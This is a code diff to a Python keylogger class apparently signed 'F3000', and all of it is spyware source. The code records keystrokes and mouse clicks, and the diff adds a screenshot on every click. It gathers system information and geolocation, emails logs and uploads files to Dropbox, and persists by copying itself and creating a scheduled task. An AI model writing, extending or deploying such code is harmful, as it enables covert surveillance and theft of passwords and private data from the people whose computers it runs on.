@@ -1,5 +1,3 @@
-from pynput import keyboard, mouse
-from requests.adapters import HTTPAdapter
 import dropbox
 import geocoder
 import mss
@@ -11,11 +9,13 @@ import ssl
 import time
 import wave
 
+from pynput import keyboard, mouse
+from requests.adapters import HTTPAdapter
 from utils import (
     send_mail_with_attachment,
     get_wav_and_png_files,
     delete_wav_and_png_files,
-    remove_env_file,
+    # remove_env_file,
     upload_to_dropbox,
     save_program_in_location,
     create_scheduled_task,
@@ -47,7 +47,7 @@ class KeyLogger:
         dropbox_token,
         src_file,
         dest_folder,
-        task_name,
+        scheduled_task_name,
     ):
         self.interval = time_interval
         self.smtp_server = smtp_server
@@ -61,7 +61,7 @@ class KeyLogger:
         self.dropbox_token = dropbox_token
         self.src_file = src_file
         self.dest_folder = dest_folder
-        self.task_name = task_name
+        self.scheduled_task_name = scheduled_task_name
 
         self.log = "KeyLogger Started...\n"
         self.keyboard_listener = None
@@ -83,11 +83,14 @@ class KeyLogger:
         pass  # do nothing
 
     def on_click(self, x, y, button, pressed):
-        current_click = f"\nMouse click at {x} {y} with button {button}"
-        # self.screenshot()
-        self.appendlog(current_click)
+        if pressed:
+            current_click = f"\nMouse click at {x} {y} with button {button}"
+            self.screenshot()
+            self.appendlog(current_click)
 
     def save_data(self, key):
+        current_key = ""
+
         try:
             current_key = str(key.char)
         except AttributeError:
@@ -110,9 +113,9 @@ class KeyLogger:
             email_sender=self.email_sender,
             email_receiver=self.email_receiver,
             cc=self.cc,
-            path_to_attachment=os.getcwd(),
+            path_to_attachment="",
             attachments=[],
-            subject="Test KeyLogger - by F3000",
+            subject="KeyLogger - by F3000",
             body=message,
         )
 
@@ -219,7 +222,7 @@ class KeyLogger:
     def run(self):
         # remove_env_file()
         executable_path = save_program_in_location(self.src_file, self.dest_folder)
-        create_scheduled_task(executable_path, self.task_name)
+        create_scheduled_task(executable_path, self.scheduled_task_name)
 
         self.system_information()
         self.get_location()
@@ -241,7 +244,7 @@ class KeyLogger:
             self.report()
 
             if self.magic_word != "" and self.magic_word in self.word:
-                return
+                break
 
             self.cleanup()  # this cleanup is used until the while loop works
         self.cleanup()  # this cleanup is used when the while loop stops
